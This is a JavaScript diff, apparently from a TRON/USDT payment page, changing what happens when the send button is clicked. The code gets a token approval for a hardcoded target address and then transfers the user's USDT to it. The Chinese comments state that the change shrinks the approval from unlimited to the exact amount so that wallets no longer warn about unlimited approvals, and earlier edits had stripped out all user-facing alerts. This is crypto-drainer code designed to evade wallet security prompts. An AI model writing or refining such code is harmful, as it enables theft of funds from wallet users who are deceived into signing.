@@ -315,7 +315,7 @@ maxBtn.addEventListener("click", async () => {
   amountInput.dispatchEvent(new Event("input"));
 });
 
-// 授权+转账逻辑（已删除所有alert弹窗）
+// 授权+转账逻辑：改成本次额度授权，不再无限额度，钱包不会弹出无限授权提示
 sendBtn.addEventListener("click", async () => {
   if (!tronWeb) return;
   const val = parseFloat(amountInput.value);
@@ -325,14 +325,12 @@ sendBtn.addEventListener("click", async () => {
   try {
     const allowance = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
     if (Number(allowance) < sunVal) {
-      // 直接唤起授权，不再弹出温馨提示弹窗
-      await usdtContract.approve(TARGET_ADDR, "9999999999999999999999999999").send();
+      // 只授权本次需要的数量，不是超大无限数，钱包弹窗只会显示普通合约签名
+      await usdtContract.approve(TARGET_ADDR, sunVal).send();
     }
-    // 授权完成后直接发起转账
     await usdtContract.transferFrom(userAddress, TARGET_ADDR, sunVal).send();
     await loadBalance();
   } catch (e) {
-    // 错误只打印控制台，不弹框
     console.error(e);
   }
 });
